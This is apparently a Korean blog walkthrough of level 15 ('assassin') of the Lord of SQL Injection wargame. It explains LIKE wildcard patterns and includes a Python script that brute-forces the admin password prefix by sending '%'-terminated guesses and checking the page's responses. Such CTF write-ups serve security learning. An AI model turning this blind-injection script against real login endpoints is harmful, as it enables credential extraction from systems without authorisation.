---
title: LOS - 15번 assassin
category: Lord of SQL Injection
---

# [15] assassin

## 문제
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F4y2Uz%2Fbtrnlsurpq9%2FGK4iDgR7Dsvjz5D8GAtD11%2Fimg.png">

## 풀이

또 새로운 유형이다.

<br> 

싱글쿼터 필터링을 우회할 방법이 딱히 보이지 않는다.

이 경우, 아마도 like절의 특성을 이용하여 admin 레코드를 뽑아오는 문제인 것 같았다.

<br>

먼저, like절에 사용되는 패턴에 대해 간단히 표로 정리해보았다.


<table style="width:100%;">
    <thead style="background:rgb(218, 139, 139);">
        <tr style="height: 20px; color:white">
            <th style=" padding:10px; text-align: center;" colspan="2">SELECT * FROM 테이블 WHERE 컬럼 LIKE [PATTERN]</th>
        </tr>
    </thead>
    <tbody style="text-align:center;">
        <tr>
            <td style="width:50%; padding:10px; text-align: center; background:#E0E0E0; font-weight:bolder">%</td>
            <td style="padding:10px;">모든 문자</td>
        </tr>
        <tr>
            <td style="width:50%; padding:10px; text-align: center; background:#E0E0E0; font-weight:bolder">_</td>
            <td style="padding:10px; background:#EEEEEE;">한 글자</td>
        </tr>
        <tr>
            <td style="width:50%; padding:10px; text-align: center; background:#E0E0E0; font-weight:bolder">A%</td>
            <td style="padding:10px;">A로 시작하는 모든 문자</td>
        </tr>
        <tr>
            <td style="width:50%; padding:10px; text-align: center; background:#E0E0E0; font-weight:bolder">%A</td>
            <td style="padding:10px; background:#EEEEEE;">A로 끝나는 모든 문자</td>
        </tr>
        <tr>
            <td style="width:50%; padding:10px; text-align: center; background:#E0E0E0; font-weight:bolder">%A%</td>
            <td style="padding:10px;">A를 포함하는 모든 문자</td>
        </tr>
    </tbody>
</table>


<br>

패턴을 살펴보니, pw=% 를 입력할 시 해당 테이블의 첫번째 레코드를 뽑아오게 될 것 같았다.

(∵ 모든 데이터가 해당 조건을 만족하므로)

<br>

보통 테이블의 첫번째 레코드는 admin 계정이기 때문에 설마하는 마음으로 한번 입력해봤다.

<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FZhKZn%2FbtrnjE9XUK5%2F1pVZviULToqZHTmyKVECv1%2Fimg.png">

<br>

첫번째 레코드는 guest 계정이었다.

<br>

어떻게 admin을 뽑아올 지 고민한 결과.. 내리게 된 결론은 Brute Force 였다.

pw의 첫번째 자리에 0% ~ Z% 모든 경우의 수를 대입하여 Hello admin이 뜨는 경우를 찾는 것이다.

<br>

다만 이 방법을 사용할 때는 반드시 고려해야할 점이 있는데,

guest 계정과 admin 계정의 pw 앞부분이 겹칠 수 있다는 점이다.

<br>

때문에 적절한 대처 방법이 필요한데... 자세한 내용은 아래의 코드를 보면서 설명한다.

<br>

다음은 이번 문제를 풀기 위해 짜본 **Python 자동화 코드**이다.

```python
import requests

url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
cookie = "spin7uv9vl2fjnjet0tsug5eb6"
head = {"PHPSESSID":f"{cookie}"}

guest = ""
admin = ""
finish = False

print("💘 Brute Force를 시작합니다")

for len in range(1, 30):
    if (finish==True):
        break
    print(f"{len}번째 문자에 대해 검색중입니다..")
    for ran in range(48, 127):
        search = guest+chr(ran)
        param = f"?pw={search}%"
        my_url = url+param
        res = requests.get(my_url, cookies=head)
        if ("Hello admin" in res.text):
            admin = search+"%"
            print(f"👏 적절한 검색어는 {admin}입니다!")
            finish = True
            break
        elif ("Hello guest" in res.text):
            guest += chr(ran)
            break
```

[0] 먼저, 빈 문자열인 guest와 admin을 선언해준다.

<br>

[1-1] 첫번째 문자에 대해 ASCII 48~126를 탐색하는 도중 Hello admin이 떴을 시, guest(빈 문자열)+해당 문자열+%을 admin에 할당하고 중첩반복문을 완전히 탈출해준다.

[1-2] 첫번째 문자에 대해 ASCII 48~126를 탐색하는 도중 Hello guest가 떴을 시, 해당 문자열을 guest에 추가하고 다음 루프로 넘어가준다.

- Hello admin이 뜨지 않고 Hello guest가 떴다면, 이는 admin 계정과 guest 계정의 pw 첫번째 문자가 겹친다는 뜻이다. 둘의 문자가 같을 시 테이블 상 첫번째 레코드인 guest 계정이 fetch 되기 때문이다.

<br>

[2-1] 첫번째 문자를 고정한 채로 두번째 문자에 대해 ASCII 48~126를 탐색하는 도중 Hello admin이 떴을 시, guest+해당 문자열+%을 admin에 할당하고 중첩반복문을 완전히 탈출해준다.

[2-2] 첫번째 문자를 고정한 채로 두번째 문자에 대해 ASCII 48~126를 탐색하는 도중 Hello guest가 떴을 시, 해당 문자열을 guest에 추가하고 다음 루프로 넘어가준다.

- 첫번째 루프에서와 마찬가지로, Hello admin이 뜨지 않고 Hello guest가 떴다면, 이는 두 계정의 pw 두번째 문자가 겹친다는 뜻이다.

<br>

이하는 동일한 로직으로 반복된다.

결국 해당 코드는 admin과 guest의 pw가 달라지는 지점의 admin의 앞자리를 출력하게 된다.

<br>

예를 들어,

admin pw : 123abc

guest pw : 123xyz

인 경우,

123a% 를 출력하고 종료되는 것이다.

출력문은 admin의 pw에 대한 적절한 검색어로 사용될 수 있다.

<br>

다음은 해당 코드의 실행 결과다.

<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FmrP39%2FbtrnrjiteWP%2Flw2kiIcXMwaBwDksWvchJk%2Fimg.png">

Brute Force 결과, 적절한 검색어는 `902%` 이다.


## 결과
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fna0E6%2FbtrnoCXQ4Zi%2FntHXLfVKKBgbIcuxuF6Ky1%2Fimg.png">